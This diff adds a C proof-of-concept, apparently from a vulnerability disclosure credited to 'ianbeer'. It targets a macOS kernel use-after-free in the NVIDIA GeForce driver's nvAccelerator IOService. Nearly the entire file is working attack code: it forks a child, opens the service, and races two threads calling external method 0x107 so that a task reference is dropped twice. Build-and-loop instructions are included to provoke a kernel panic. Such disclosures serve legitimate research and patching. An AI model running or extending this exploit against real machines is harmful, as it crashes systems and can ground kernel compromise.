@@ -1,0 +1,147 @@
+/*
+nvDevice::SetAppSupportBits is external method 0x107 of the nvAccelerator IOService.
+
+It calls task_deallocate without locking. Two threads can race calling this external method to drop
+two task references when only one is held.
+
+Note that the repro forks a child which give the nvAccelerator a different task otherwise
+the repro is more likely to leak task references than panic.
+*/
+
+// ianbeer
+
+#if 0
+MacOS kernel UAF due to lack of locking in nvidia GeForce driver
+
+nvDevice::SetAppSupportBits is external method 0x107 of the nvAccelerator IOService.
+
+It calls task_deallocate without locking. Two threads can race calling this external method to drop
+two task references when only one is held.
+
+Note that the repro forks a child which give the nvAccelerator a different task otherwise
+the repro is more likely to leak task references than panic.
+#endif
+
+// build: clang -o nvtask nvtask.c -framework IOKit
+// run: while true; do ./nvtask; done
+
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+#include <pthread.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+
+#include <IOKit/IOKitLib.h>
+
+uint64_t set_app_support_bits(mach_port_t conn) {
+  kern_return_t err;
+  
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+
+  inputStructCnt = 1;
+  outputStructCnt = 1;
+
+  inputStruct[0] = 0xff;
+
+  err = IOConnectCallMethod(
+   conn,
+   0x107,
+   inputScalar,
+   inputScalarCnt,
+   inputStruct,
+   inputStructCnt,
+   outputScalar,
+   &outputScalarCnt,
+   outputStruct,
+   &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+   printf("IOConnectCall error: %x\n", err);
+  } else{
+    printf("worked?\n");
+  }
+  
+  return 0;
+}
+
+
+volatile int go = 0;
+volatile int running = 0;
+void* thread_func(void* arg) {
+  mach_port_t conn = (mach_port_t)arg;
+  printf("thread running\n");
+  running = 1;
+  while(!go){;}
+  set_app_support_bits(conn);
+  return 0;
+}
+
+int main(int argc, char** argv){
+  pid_t child_pid = fork();
+  if (child_pid == -1) {
+    printf("fork failed\n");
+    return 0;
+  }
+  if (child_pid) {
+    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("nvAccelerator"));
+    if (service == MACH_PORT_NULL) {
+      printf("unable to find service\n");
+      return 0;
+    }
+    printf("got service: 0x%x\n", service);
+
+    io_connect_t conn = MACH_PORT_NULL;
+    kern_return_t err = IOServiceOpen(service, mach_task_self(), 5, &conn); // nvDevice
+    if (err != KERN_SUCCESS) {
+      printf("unable to open ioservice\n");
+      return 0;
+    }
+    printf("got service\n");
+    pthread_t th;
+    pthread_create(&th, NULL, thread_func, (void*)conn);
+
+    while(!running){;}
+    go = 1;
+    set_app_support_bits(conn);
+
+    pthread_join(th, NULL);
+
+    int loc = 0;
+    wait(&loc);
+  } else {
+    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("nvAccelerator"));
+    if (service == MACH_PORT_NULL) {
+      printf("unable to find service\n");
+      return 0;
+    }
+    printf("got service: 0x%x\n", service);
+
+    io_connect_t conn = MACH_PORT_NULL;
+    kern_return_t err = IOServiceOpen(service, mach_task_self(), 5, &conn); // nvDevice
+    if (err != KERN_SUCCESS) {
+      printf("unable to open ioservice\n");
+      return 0;
+    }
+    printf("got service\n");
+    set_app_support_bits(conn);
+    
+  }
+
+  return 0;
+}
